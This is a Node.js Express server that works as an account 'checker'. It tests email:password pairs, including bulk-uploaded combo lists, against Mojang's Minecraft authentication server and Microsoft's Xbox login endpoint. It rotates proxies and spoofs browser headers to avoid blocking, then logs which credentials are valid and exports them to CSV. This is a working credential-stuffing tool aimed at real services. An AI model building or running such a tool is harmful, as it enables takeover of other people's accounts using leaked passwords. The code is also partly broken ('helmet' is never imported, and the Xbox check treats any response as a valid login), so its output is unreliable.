const express = require('express');
const axios = require('axios');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const multer = require('multer');
const createCsvWriter = require('csv-writer').createObjectCsvWriter;
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const app = express();

// Middleware
app.use(helmet());
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));
app.set('trust proxy', 1);

// Rate limiting
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false
});
app.use('/api/', apiLimiter);

// SQLite setup (Render compatible)
const dbPath = path.join(process.cwd(), 'checker.db');
if (!fs.existsSync(path.dirname(dbPath))) {
  fs.mkdirSync(path.dirname(dbPath), { recursive: true });
}

const db = new sqlite3.Database(dbPath);
db.run(`CREATE TABLE IF NOT EXISTS results (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  type TEXT,
  email TEXT,
  username TEXT,
  uuid TEXT,
  status TEXT,
  checked_at DATETIME DEFAULT CURRENT_TIMESTAMP
)`);

// Proxies support
const proxies = fs.existsSync('proxies.txt') ? 
  fs.readFileSync('proxies.txt', 'utf8').split('\n').filter(Boolean) : [];

// Minecraft checker
async function checkMinecraft(email, password, proxy = null) {
  const config = {
    timeout: 15000,
    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
  };

  if (proxy && proxies.length > 0) {
    const randomProxy = proxies[Math.floor(Math.random() * proxies.length)];
    config.proxy = {
      protocol: 'http',
      host: randomProxy.split(':')[0],
      port: parseInt(randomProxy.split(':')[1])
    };
  }

  try {
    const response = await axios.post('https://authserver.mojang.com/authenticate', {
      agent: { name: "Minecraft", version: 1 },
      username: email,
      password: password
    }, config);

    const data = response.data;
    return {
      valid: true,
      username: data.selectedProfile?.name || 'Unknown',
      uuid: data.selectedProfile?.id || null,
      premium: true
    };
  } catch (error) {
    if (error.response?.status === 403) {
      return { valid: false, error: 'Invalid credentials' };
    }
    return { valid: false, error: 'Connection failed' };
  }
}

// Xbox checker
async function checkXbox(email, password, proxy = null) {
  const config = proxy && proxies.length > 0 ? {
    proxy: {
      protocol: 'http',
      host: proxies[Math.floor(Math.random() * proxies.length)].split(':')[0],
      port: parseInt(proxies[Math.floor(Math.random() * proxies.length)].split(':')[1])
    }
  } : {};

  try {
    await axios.post('https://login.live.com/ppsecure/post.srf', 
      new URLSearchParams({
        'loginfmt': email,
        'passwd': password,
        'LoginOptions': '1'
      }), {
        ...config,
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        maxRedirects: 3,
        timeout: 15000
      }
    );
    return { valid: true, message: 'Xbox account valid' };
  } catch (error) {
    return { valid: false, error: 'Invalid Xbox credentials' };
  }
}

// API Routes
app.post('/api/check-minecraft', async (req, res) => {
  const { email, password, useProxy = false } = req.body;
  
  if (!email || !password) {
    return res.json({ success: false, error: 'Email and password required' });
  }

  const result = await checkMinecraft(email, password, useProxy);
  
  // Save to DB
  db.run('INSERT INTO results (type, email, username, uuid, status) VALUES (?, ?, ?, ?, ?)', 
    ['minecraft', email, result.username || '', result.uuid || '', result.valid ? 'VALID' : 'INVALID']);

  res.json({ success: true, ...result });
});

app.post('/api/check-xbox', async (req, res) => {
  const { email, password, useProxy = false } = req.body;
  
  const result = await checkXbox(email, password, useProxy);
  
  db.run('INSERT INTO results (type, email, status) VALUES (?, ?, ?)', 
    ['xbox', email, result.valid ? 'VALID' : 'INVALID']);
  
  res.json({ success: true, ...result });
});

// Bulk checker
const upload = multer({ dest: 'uploads/' });
app.post('/api/bulk-check', upload.single('accounts'), async (req, res) => {
  if (!req.file) return res.json({ success: false, error: 'No file uploaded' });
  
  const accounts = fs.readFileSync(req.file.path, 'utf8')
    .split('\n')
    .map(line => line.trim())
    .filter(line => line.includes(':'))
    .map(line => {
      const [email, pass] = line.split(':');
      return { email, password: pass };
    }).slice(0, 50); // Max 50

  const results = [];
  for (const account of accounts) {
    const result = await checkMinecraft(account.email, account.password);
    results.push({ ...account, ...result });
    
    db.run('INSERT INTO results (type, email, username, status) VALUES (?, ?, ?, ?)', 
      ['bulk', account.email, result.username || '', result.valid ? 'VALID' : 'INVALID']);
    
    await new Promise(r => setTimeout(r, 2000)); // Rate limit
  }

  fs.unlinkSync(req.file.path); // Cleanup
  res.json({ success: true, results, count: results.length });
});

// Stats
app.get('/api/stats', (req, res) => {
  db.all(`
    SELECT 
      type,
      COUNT(*) as total,
      SUM(CASE WHEN status = 'VALID' THEN 1 ELSE 0 END) as valid
    FROM results 
    GROUP BY type
  `, (err, rows) => {
    if (err) return res.json({ success: false });
    res.json({ success: true, stats: rows });
  });
});

// Export CSV
app.get('/api/export-csv', (req, res) => {
  db.all('SELECT * FROM results ORDER BY checked_at DESC LIMIT 10000', (err, rows) => {
    const csvWriter = createCsvWriter({
      path: 'results.csv',
      header: [
        {id: 'type', title: 'Type'},
        {id: 'email', title: 'Email'},
        {id: 'username', title: 'Username'},
        {id: 'uuid', title: 'UUID'},
        {id: 'status', title: 'Status'},
        {id: 'checked_at', title: 'Checked At'}
      ]
    });

    csvWriter.writeRecords(rows).then(() => {
      res.download('results.csv', 'checker-results.csv', (err) => {
        if (err) fs.unlinkSync('results.csv');
      });
    });
  });
});

// Health check
app.get('/health', (req, res) => res.json({ status: 'OK' }));

// Render production port
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Checker running on port ${PORT}`);
});